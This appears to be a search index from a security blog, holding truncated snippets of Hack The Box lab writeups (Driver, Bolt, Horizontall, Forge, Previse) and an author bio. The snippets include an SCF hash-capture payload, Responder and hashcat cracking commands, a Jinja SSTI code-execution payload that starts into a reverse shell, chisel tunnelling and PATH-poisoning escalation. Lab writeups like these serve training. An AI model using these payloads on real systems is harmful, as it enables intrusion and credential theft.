“driver.htb” to the /etc/hosts and start fuzzing for any Vhosts but will find none. let’s navigate around this site will find option Firmware Updates is working and asking for updating fir","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:2:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"SMB authentication : according to Microsoft Documentation : NTLM and the older LAN Manager (LM) encryption are supported by Microsoft SMB Protocol. Both encryption methods use challenge-response authentication, where the server sends the client a random string and the client returns a computed response string that proves the client has sufficient credentials for access.\rso if the client (the target) tries to connect to us (attacker) the NTLM hash will be used to authenticate and then we can capt","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:2:1","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Exploitation : searching for “smb share and printer firmware update exploit” will find this blog here so creating the payload : [Shell] Command=2 IconFile=\\\\\u003cip\u003e\\share\\Mesbaha.ico [Taskbar] Command=ToggleDesktop\rand name it as \"@hack.scf\" and before uploading it run Responder to capture the hash (hopefully): sudo responder -I tun0 -rdwv\rGREAT we have NTLMv2 hash now : now we can try to crack it with hashcat : hashcat -m 5600 tony_hash /usr/share/wordlists/rockyou.txt\rso we have username and pass","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:2:2","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Foothold : Most of the impacket tools that takes username:password and try to login depends on SMB shares (i.e : ADMIN$ and C$) and hence they are not accessible they won’t work . Remember the port we have found in the full port scan ? reading the blog article i have mentioned above If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)\rand they me","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:3:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Privilege escalation : you can start uploading Winpeas and follow the output but i will try first some manual checks first we know this Box is about printers and drivers maybe we find some exploit that way in the Microsoft post is says we can run Get-Service -Name Spooler to check if it is running , and it is running Hence the service is running indeed we can try to exploit it and see if it works , there is this great one here that we can try we can try to upload it then it will add for us a new","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:4:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Pwned","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:5:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Linux Machines"],"content":"In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost “demo” which has some functions aren’t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private g","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:0:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Scanning : $ nmap -A -T 4 $IP -sV -oN nmap/intial PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Starter Website - About 443/tcp open ssl/http ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:1:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Enumeration : visiting the web application at bolt.htb or passbolt.bolt.htb we are introduced with : there is a feedback form at the end but it doesn’t work we can start viewing the pages at the application : at /download there is a file we can download so let’s download it and see what it contains extracting the image.tar we can see it contains : each directory contains a layer.tar file , we can utilize some bash magic to extract them all : #!/usr/bin/bash for file in $( ls -d */) do tar -xf $f","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:2:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Enumeration Harder now as we are logged in in all the web applications we should have notice that demo.bolt.htb and bolt.htb are pretty much the same however in the demo there are more features and pages we can access . we now are searching for any input at any page to test it at demo and under profile page we have this setting tab which has input option : we can test it and instantly at mail.bolt.htb an email has received and when we pressed the link another mail has received : so now we have u","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:3:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"exploitation : testing SSTI can began with a basic test like : we now will receive first mail to confirm and 2nd one with the response : Nice we have a valid SSTI exploit at the name field , we can try to leverage it to RCE with payload like those {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}\rresponse : so now we can get a reverse shell with : {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:4:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Foothold : and we have our shell as www-data : if we look around we will find a lot of files to explore , we can use Linpeas to guide us where to look first and non expected files in some directories and if there is a path to escalate our privilege . we can check roundcube/config/config.inc.php and will find : which is a potential password we can use latter also there is /etc/passbolt we can check it to search for potential passwords in it we can use : grep --color=auto -rnw '.' -Rie \"password\" ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:5:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Eddie user : now we can ssh to the eddie user : Back to our linpeas output we had : and he had one mail from clark contains : Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it\rso we should search for this browser to see what is this mail about we can find google-chrome is the browser mentioned now we want to get eddie private key to be able to read the message we have seen before in the MySQL DB . we can start s","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:6:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Decrypting the message now to decrypt a PGP encrypted message we will use : $ gpg --import eddie_private $ gpg -d message.inc\rbut it asks for a passphrase to import the gpg key we can utilize gpg2john to get the hash then john to crack it $ gpg2john eddie_private \u003e eddie_key_hash $ john --wordlist=/usr/share/wordlists/rockyou.txt eddie_key_hash\rnow we can decrypt the message : ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:6:1","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Root Access using the password we just found in the message : Z(2rmxsNW(Z?3=p/9s we get the root access ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:7:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh Scanning : to make our life easier will export ip to use the variable $IP instead of re-typing ip $export IP=10.10.11.105\rstarting with a basic scanning : $nmap -sV -v $IP -oN nmap/intial\rPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:0:0","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"directory Busting : $ gobuster dir -u \"http://horizontall.htb/\" -w /usr/share/wordlists/dirb/common.txt\rresults : /css (Status: 301) [Size: 194] [--\u003e http://horizontall.htb/css/] /favicon.ico (Status: 200) [Size: 4286] /img (Status: 301) [Size: 194] [--\u003e http://horizontall.htb/img/] /index.html (Status: 200) [Size: 901] /js (Status: 301) [Size: 194] [--\u003e http://horizontall.htb/js/]\r","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:0:1","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"Vhosts enumeration : $ gobuster vhost -u horizontall.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt\ryou can also use ffuf like this : $ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.Horizontall.htb\" -u http://horizontall.htb/ -c -fc 301\r-fc : filter by code u don’t want results: www [Status: 200, Size: 901, Words: 43, Lines: 2] api-prod [Status: 200, Size: 413, Words: 76, Lines: 20]\radd api-prod to the /","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:0:2","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"Foothold : ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:1:0","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"Directory Busting : $ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://api-prod.horizontall.htb/FUZZ\rresults : Admin [Status: 200, Size: 854, Words: 98, Lines: 17] ADMIN [Status: 200, Size: 854, Words: 98, Lines: 17] admin [Status: 200, Size: 854, Words: 98, Lines: 17] favicon.ico [Status: 200, Size: 1150, Words: 4, Lines: 1] index.html [Status: 200, Size: 413, Words: 76, Lines: 20] reviews [Status: 200, Size: 507, Words: 21, Lines: 1] robots.txt [Status: 200, Size: 121, Words: 19, Line","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:1:1","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"stablize the shell : python -c \"import pty;pty.spawn('/bin/bash')\"\r","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:1:2","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"we are in ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:1:3","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"Privilege escalation : after some manual enumeration i tried to see what are the ports running on this machine with ss -lpnut\rand found this : Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port\rtcp LISTEN 0 128 127.0.0.1:8000 0.0.0.0:*\ryou can also run LinEnum and reach the same conclusion this port wasn’t in the nmap scan so it isn’t publiclly exposed. to verify this is a path we can take to look for an escalation Factor i tried to see what is the service running at this port : and ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:2:0","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"port forwading we have many ways to achieve that i tried ssh remote port forwarding But it doesn’t work , so i used chisel download version on your side and upload same version on the victim side so what we are going to do here is port forward 8000 at this machine to 8000 at our machine and the traffic is through port 12312 commands : on server side (my side) : $./chisel_1.7.6_linux_amd64 server -p 12312 --reverse on victim side : $ ./chisel_1.7.6_linux_amd64 client \u003cmy_ip\u003e:12312 R:8000:127.0.0.","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:3:0","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"detailed writeup for retired machine Forge From Hackthebox ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:0:0","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"Scanning : basic scanning note : add \u003cip\u003e forge.htb to the /etc/hosts nmap -sV -A -T 4 10.10.11.111\routput : PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA) | 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA) |_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apach","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:1:0","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"Enumeration : port 21 : is Filtered trying to access it ftp \u003cip\u003e\rreturns ftp: connect: Connection timed out\rso it seems we can’t access it Publicly port 80 : “the web application” we have some images located at /static/images , knowing that from page source code . so probably image we upload won’t be rendered on this page and we have upload an image Function with 2 options either from your machine or form url testing from my machine to upload a .png file and see it also accepts any extension and","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:2:0","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"More Enumeration : Typically in HTB , another Vhost is a common scenario so trying to get Fuzzing it with ffuf ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million 5000.txt -u http://forge.htb/ -H \"Host: FUZZ.forge.htb\" -fc 302,404\routput: admin [Status: 200, Size: 27, Words: 4, Lines: 2]\radd admin.forge.htb to /etc/hosts trying to access it : so putting things together we will have one conclusion to continue from : forge.htb can make a valid request to admin.forge.htb ,","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:2:1","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"Privilege escalation : checking permissions : -rwxr-xr-x 1 root root 1447 May 31 2021 /opt/remote-manage.py\rreading and analyzing the script : first it sets a listener on a random port we can only access the port locally so we will get a second ssh session to interact with it . port = random.randint(1025, 65535) try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind(('127.0.0.1', port)) sock.listen(1) print(f'Listening o","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:2:2","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"investigation : we have at /var/www the following : html forge admin\rin the source code we can see : blacklist = [\"forge.htb\", \"127.0.0.1\", \"10.10.10.10\", \"::1\", \"localhost\", '0.0.0.0', '[0:0:0:0:0:0:0:0]']\rwhich is not enough Filtering to mitigate SSRF , we have Bypassed that By changing any letter at forge.htb to Uppercase ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-forge/:2:3","tags":["Hackthebox","SSRF"],"title":"Forge Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-forge/"},{"categories":["Linux Machines"],"content":"In this Writeup you will find walkthrough of the retired machine previse From Hackthebox export IP=10.10.11.104 scanning : ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:0:0","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Linux Machines"],"content":"intial sudo nmap -sV -vv $IP -oN nmap/intial\rPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))\rvisiting the web page : tried some sqli but not worked ","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:1:0","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Linux Machines"],"content":"directory brute-force : $ gobuster dir -u http://10.10.11.104/ -w /usr/share/dirb/wordlists/big.txt -x php,txt\rfound : /accounts.php (Status: 302) [Size: 3994] [--\u003e login.php] /config.php (Status: 200) [Size: 0] /download.php (Status: 302) [Size: 0] [--\u003e login.php] /files.php (Status: 302) [Size: 4914] [--\u003e login.php]\ryou can use curl without enabling redirect and will notice the same thing immediately curl http://10.10.11.104/accounts.php -vvv\rBut i opened up my burpsuite and observe the reques","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:2:0","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Linux Machines"],"content":"privilege escalation so let’s read the script : #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time gzip -c /var/log/apache2/access.log \u003e /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u003e /var/backups/$(date --date=\"yest","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:3:0","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Linux Machines"],"content":"PATH poisoning we can see here : https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ we can use that so when we execute this as root “with sudo” gzip will refer to the /tmp in the path i don’t know why but the shell doesn’t return any result although i gained the root access so i make a reverse shell and it worked perfectly Pwned","date":"2022-01-27","objectID":"/posts/linux-machines/2022-01-27-previse/:3:1","tags":["Hackthebox","RCE","path poisoning"],"title":"Previse Hackthebox writeup","uri":"/posts/linux-machines/2022-01-27-previse/"},{"categories":["Windows Machines"],"content":"In this room, we’ll learn how to exploit a common misconfiguration on a widely used automation server(Jenkins - This tool is used to create continuous integration/continuous development pipelines that allow developers to automatically deploy their code once they made change to it). After which, we’ll use an interesting privilege escalation method to get full system access. Scanning we can start with this scan providing the -Pn as it is a windows machine and may not respond ICMP nmap -Pn -A -T4 $","date":"2022-01-18","objectID":"/posts/windows-machines/2022-01-07-alfred/:0:0","tags":["Jekyll"],"title":"Alferd","uri":"/posts/windows-machines/2022-01-07-alfred/"},{"categories":null,"content":"Hello there , I am Hussein Misbah AKA 0xMesbaha a Cybersecurity Engineer @Cyshield Company with +4 years of experience in pentesting , CTFs and security in general. Currently interested in Applications Pentesting and Malware Development Offensive Security Web Expert (OSWE) Offensive Security certified professional (OSCP) Certified red team expert (CRTE) Certified red team professional (CRTP) EMAPT Certified EWPTX Certified Certified Azure red team professional (CARTP) CVE-2024-28347 ,CVE-2024-28","date":"0001-01-01","objectID":"/about/:0:0","tags":null,"title":"about","uri":"/about/"}]